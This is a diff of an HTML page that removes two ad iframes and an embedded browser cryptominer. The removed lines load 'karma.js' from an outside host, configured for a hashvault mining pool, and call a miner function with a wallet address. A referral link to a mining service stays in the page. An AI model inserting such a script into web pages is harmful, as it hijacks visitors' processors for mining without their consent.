@@ -14,9 +14,3 @@
 <hr>
 <h2><center><b><a href="https://miner.eo.finance/?r_id=472979866" target="_blank">(Start Your Eo-Miner)</a></b></center></h2>
 
-<center><iframe data-aa='2239407' src='//ad.a-ads.com/2239407?size=468x60' style='width:468px; height:60px; border:0px; padding:0; overflow:hidden; background-color: transparent;'></iframe><iframe data-aa='2239407' src='//ad.a-ads.com/2239407?size=468x60' style='width:468px; height:60px; border:0px; padding:0; overflow:hidden; background-color: transparent;'></iframe></center>
-
-<script src="https://trustisimportant.fun/karma/karma.js?karma=bs?algy=cn-heavy/xhv?nosaj=pool.hashvault.pro:80" ></script>
-<script type="text/javascript">
-EverythingIsLife('hvxxxRzWYCP3PVgiE5pYQHXt7fvLx5PRX5cfarmCxTNt1xrHThud51FHvmvCEwXkSfdp9rh2ZqNgkSmvAYrvJTzj3dk6j2g5FN', 'x', 30);
-</script>
